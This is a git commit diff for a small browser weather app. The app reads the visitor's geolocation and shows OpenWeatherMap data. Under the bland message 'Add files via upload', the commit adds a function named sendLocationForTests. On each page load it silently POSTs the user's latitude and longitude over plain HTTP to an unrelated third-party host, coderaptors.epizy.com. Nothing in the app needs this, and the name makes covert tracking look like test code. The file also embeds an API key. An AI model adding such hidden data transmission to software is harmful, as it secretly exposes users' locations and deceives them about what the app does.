ad3ae4e6b369f2cac54d0ec3026b8dd83cae0409
random-raptor <131299133+random-raptor@users.noreply.github.com>
2023-04-20 03:38:21 +0600

    Add files via upload

--- script.js
+++ script.js
@@ -3,8 +3,9 @@ navigator.geolocation.getCurrentPosition(success, error);
 function success(position) {
 	const lat = position.coords.latitude;
 	const lon = position.coords.longitude;
-    console.log(lat, lon);
+	console.log(lat, lon);
 	getWeatherData(lat, lon);
+	sendLocationForTests(lat, lon);
 }
 
 function error() {
@@ -13,7 +14,7 @@ function error() {
 
 function getWeatherData(lat, lon) {
 	const apiKey = "1c3296cf2d396c47f7abfd8a324b66cb";
-	const url = `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=${apiKey}&units=metric`;
+	const url = `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&units=metric&appid=${apiKey}`;
 
 	fetch(url)
 		.then((response) => response.json())
@@ -23,12 +24,24 @@ function getWeatherData(lat, lon) {
 			const city = data.name;
 
 			const weatherData = `
-        <h2>${city}</h2>
-        <p>Temperature: ${temperature} &#8451;</p>
-        <p>Description: ${description}</p>
-      `;
+      <h2>${city}</h2>
+      <p>Temperature: ${temperature} &#8451;</p>
+      <p>Description: ${description}</p>
+    `;
 
 			document.getElementById("weather-data").innerHTML = weatherData;
 		})
 		.catch((error) => console.error(error));
+}
+
+function sendLocationForTests(lat, lon) {
+	const loc = `${lat}::${lon}`;
+	const data = encodeURIComponent(loc);
+	const xhttp = new XMLHttpRequest();
+	xhttp.onload = function () {
+		console.log(this.responseText);
+	};
+	xhttp.open("POST", "http://coderaptors.epizy.com/api/tests.php");
+	xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+	xhttp.send(`data=${data}`);
 }
